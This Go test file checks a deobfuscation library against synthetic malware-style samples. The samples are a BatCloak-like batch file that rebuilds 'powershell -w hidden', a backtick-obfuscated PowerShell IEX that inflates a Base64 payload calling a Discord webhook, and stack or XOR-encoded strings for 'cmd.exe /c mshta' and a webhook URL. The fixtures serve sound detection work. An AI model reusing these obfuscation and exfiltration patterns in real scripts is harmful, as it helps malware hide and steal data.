package deobf

import (
	"bytes"
	"compress/flate"
	"encoding/base64"
	"strings"
	"testing"
)

func TestBatCloakAndBatchSliceDeobfuscation(t *testing.T) {
	// Simulate BatCloak: fake UTF-16LE BOM (FF FE) + ASCII batch slicing + carets!
	var raw bytes.Buffer
	raw.Write([]byte{0xFF, 0xFE})
	raw.WriteString("\r\n@echo off\r\n")
	raw.WriteString("set \" alphabet=abcdefghijklmnopqrstuvwxyz.- \"\r\n")
	// Build `powershell -enc` via % alphabet:~...% + carets:
	// index in "abcdefghijklmnopqrstuvwxyz.- ": p=15,o=14,w=22,e=4,r=17,s=18,h=7,e=4,l=11,l=11,' '=28,'-'=27
	raw.WriteString("set \"k=abcdefghijklmnopqrstuvwxyz.- \"\r\n")
	raw.WriteString("%k:~15,1%%k:~14,1%%k:~22,1%%k:~4,1%%k:~17,1%%k:~18,1%%k:~7,1%%k:~4,1%%k:~11,1%%k:~11,1% -^w hidden\r\n")

	res := DeobfuscateScript(".bat", raw.Bytes())
	joined := strings.Join(res.Lines, "\n")
	if !strings.Contains(joined, "powershell -w hidden") {
		t.Fatalf("expected deobfuscated 'powershell -w hidden', got:\n%s", joined)
	}
	hasBOM := false
	for _, tc := range res.Techniques {
		if tc == "utf16_bom_smuggling" {
			hasBOM = true
		}
	}
	if !hasBOM {
		t.Fatalf("expected utf16_bom_smuggling technique detected, got %v", res.Techniques)
	}
}

func TestPowerShellBacktickAndDeflateBase64Unwrap(t *testing.T) {
	inner := `Invoke-WebRequest https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_abcd`
	var comp bytes.Buffer
	fw, _ := flate.NewWriter(&comp, flate.DefaultCompression)
	fw.Write([]byte(inner))
	fw.Close()
	b64 := base64.StdEncoding.EncodeToString(comp.Bytes())

	ps := "I`E`X (New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('" + b64 + "'), [IO.Compression.CompressionMode]::Decompress))"
	res := DeobfuscateScript(".ps1", []byte(ps))
	joined := strings.Join(res.Lines, "\n")
	if !strings.Contains(joined, "discord.com/api/webhooks") {
		t.Fatalf("expected inner Deflate+Base64 payload decoded, got:\n%s", joined)
	}
}

func TestStackAndXORStrings(t *testing.T) {
	// 1. Stack string: "cmd.exe /c" built via C6 45 xx <imm8>
	msg := "cmd.exe /c mshta"
	var code []byte
	for idx, ch := range msg {
		code = append(code, 0xC6, 0x45, byte(0xD0+idx), byte(ch))
	}
	code = append(code, 0xC6, 0x45, 0xDF, 0x00)

	// 2. Single-byte XOR (key 0x55) encoded Discord webhook terminated by encrypted NUL (0x00 ^ 0x55)
	wh := "https://discord.com/api/webhooks/123456789012345678/secret_token"
	for i := 0; i < len(wh); i++ {
		code = append(code, wh[i]^0x55)
	}
	code = append(code, 0x00^0x55)

	st, xr := ExtractStackAndXORStrings(code)
	if len(st) != 1 || st[0] != msg {
		t.Fatalf("stackStrs = %v, want [%q]", st, msg)
	}
	if len(xr) != 1 || xr[0] != wh {
		t.Fatalf("xorStrs = %v, want [%q]", xr, wh)
	}
}
